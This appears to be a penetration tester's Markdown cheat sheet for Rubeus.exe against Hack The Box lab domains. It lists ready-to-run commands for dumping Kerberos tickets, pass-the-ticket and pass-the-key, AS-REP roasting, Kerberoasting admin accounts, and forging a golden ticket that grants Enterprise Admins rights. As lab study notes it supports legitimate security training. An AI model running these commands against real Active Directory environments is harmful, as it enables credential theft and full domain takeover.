---
type: tool
category: AD
tags:
  - tool
---
# Overview

## Commands
## Rubeus.exe
### Harvesting Tickets - Rubeus.exe
Gather Kerberos tickets:
```cmd
Rubeus.exe dump /nowrap > rubtickets.txt
```

### Pass the Key - Rubeus.exe
#### With "Ticket-file"
```cmd 
Rubeus.exe ptt /ticket:[0;58d43]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi
```
#### AES256
Request a new `Ticket Granting Ticket (TGT)` and import `/ppt`it to the current session.
```cmd
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /ppt
```

#### Powershell remoting - Rubeus.exe
1. import Ticket into current session:
```cmd
Rubeus.exe ptt /ticket:[0;199408]-2-0-60a1000-julio@krbtgt-INLANEFREIGHT.HTB.kirbi
```
2. Check if ticket was properly importet:
```cmd
klist
```
3. Start Powershell remoting:
```powershell
Enter-PSSession -ComputerName DC01.inlanefreight.htb
```

#### ASREP-Roast Useraccount
```powershell
.\Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat
```

#### Forging a Golden Ticket - Rubeus
The `/rc4` flag is the NT hash for the KRBTGT account. The `/sids` flag will tell Rubeus to create our Golden Ticket giving us the same rights as members of the Enterprise Admins group in the parent domain:
```powershell
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```


#### Kerboroasting - Rubeus
> [!INFO] Note
> The use of `tgtdeleg` may be stealthier, since the target system makes the request directly. But it can lead to the error `KRB_AP_ERR_BAD_INTEGRITY`, there can be several causes for this, such as "Time Asynchrony".

1. Retrieve  `kerberostable users` stats:
```powershell
.\Rubeus.exe kerberoast /preview
```
and list them:
```powershell
.\Rubeus.exe kerberoast /stats
```
2. Request tickets for accounts with the `admincount` attribute set to `1`:
```powershell
.\Rubeus.exe kerberoast /tgtdeleg /ldapfilter:'admincount=1' /nowrap
```
we can also just simply request the TGS for a specific user. (If we want to perform this across a forest, we can specifiy the forest-domain with `/domain:FQDN`):
```powershell
.\Rubeus.exe kerberoast /tgtdeleg /user:USER /nowrap
```
3. We can pass the hash to hashcat now.


## Important Parameter
rubeus
	`/nowrap` = prevents any base64 ticket from being malformed
	`/tgtdeleg` = specifies that we want only RC4 encryption (doesn't from Server 2019)